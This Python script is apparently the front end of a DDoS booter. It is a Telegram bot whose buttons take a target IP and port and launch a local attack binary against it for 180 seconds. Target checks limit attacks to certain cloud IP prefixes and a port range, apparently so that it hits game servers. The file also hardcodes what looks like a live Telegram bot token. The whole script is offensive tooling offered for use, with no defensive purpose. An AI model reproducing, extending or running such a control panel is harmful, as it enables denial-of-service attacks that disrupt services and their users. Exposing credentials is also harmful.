import asyncio
import random
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, filters, ContextTypes

# Bot Configuration
TOKEN = "7343295464:AAEM7vk5K3cNXAywZC_Q11wmMzMu4gk09PU"
BINARY_PATH = "./Moin"
ATTACK_TIME = 180
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
ALLOWED_PORT_RANGE = range(10003, 30000)

# Attack Tracking
attacks = {}

# Keyboard Markup
main_keyboard = ReplyKeyboardMarkup(
    [
        [KeyboardButton("🚀 ATTACK")],
    ],
    resize_keyboard=True
)

attack_keyboard = ReplyKeyboardMarkup(
    [
        [KeyboardButton("🟢 START ATTACK"), KeyboardButton("🔴 STOP ATTACK")],          [KeyboardButton("⚫ RESET ATTACK")],
        [KeyboardButton("⚪ BACK")],
    ],
    resize_keyboard=True
)

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome! Use the menu below.", reply_markup=main_keyboard)

# Validate IP & Port
def validate_target(ip, port):
    try:
        port = int(port)
        if not ip.startswith(ALLOWED_IP_PREFIXES):
            return False
        if port in BLOCKED_PORTS or port not in ALLOWED_PORT_RANGE:
            return False
        return True
    except ValueError:
        return False

# Attack Menu
async def attack_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎯 Enter Target (IP PORT)", reply_markup=attack_keyboard)

# Handle Attack Input
async def handle_attack_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ip, port = update.message.text.split()
        if validate_target(ip, port):
            context.user_data["target"] = (ip, port)
            await update.message.reply_text(f"🎯 Target set: {ip}:{port}", reply_markup=attack_keyboard)
        else:
            await update.message.reply_text("❌ Invalid target! Use format: `1.1.1.1 1111`", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Invalid format! Use: `<IP> <PORT>`", parse_mode="Markdown")

# Start Attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if "target" not in context.user_data:
        await update.message.reply_text("❌ Configure target first!", reply_markup=attack_keyboard)
        return  

    ip, port = context.user_data["target"]
    try:
        process = await asyncio.create_subprocess_exec(BINARY_PATH, ip, str(port), str(ATTACK_TIME))
        attacks[update.message.from_user.id] = process

        effect = random.choice(["💥", "🔥", "⚡", "💣", "🚀"])
        await update.message.reply_text(f"{effect} Attack launched on `{ip}:{port}` for `{ATTACK_TIME}s`", parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Attack failed: `{str(e)}`", parse_mode="Markdown")

# Stop Attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in attacks:
        await update.message.reply_text("❌ No active attack to stop!")
        return

    attacks[user_id].terminate()
    del attacks[user_id]
    await update.message.reply_text("🛑 Attack stopped successfully!")

# Reset Attack
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop("target", None)
    await update.message.reply_text("🔄 Attack configuration reset", reply_markup=attack_keyboard)

# Back to Main
async def back_to_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔙 Returning to main menu.", reply_markup=main_keyboard)

# Main Function
def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Regex("^🚀 ATTACK$"), attack_menu))
    app.add_handler(MessageHandler(filters.Regex("^🟢 START ATTACK$"), start_attack))
    app.add_handler(MessageHandler(filters.Regex("^🔴 STOP ATTACK$"), stop_attack))
    app.add_handler(MessageHandler(filters.Regex("^⚫ RESET ATTACK$"), reset_attack))
    app.add_handler(MessageHandler(filters.Regex("^⚪ BACK$"), back_to_main))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r"^\d+\.\d+\.\d+\.\d+ \d+$"), handle_attack_input))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()